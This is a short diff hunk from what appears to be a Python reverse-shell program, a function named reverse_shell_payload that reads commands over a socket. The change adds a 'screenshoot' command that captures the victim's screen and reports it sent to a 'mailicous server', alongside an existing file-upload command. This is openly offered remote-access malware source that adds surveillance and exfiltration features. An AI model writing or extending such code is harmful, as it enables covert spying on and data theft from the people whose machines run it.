@@ -161,6 +161,12 @@ def reverse_shell_payload():
            if cmd.lower() == "help":
                s.send(banner.encode())
                continue
+           if cmd.lower() == "screenshoot":
+               if get_screenshot() == True:
+                   s.send(b"The screen shot has been sent to mailicous server")
+               else:
+                   s.send(b"An issue check your code")
+               continue
            if cmd.lower().startswith("put-files"):
                 args_files = cmd.split()
                 if  put_files(args_files) == True:
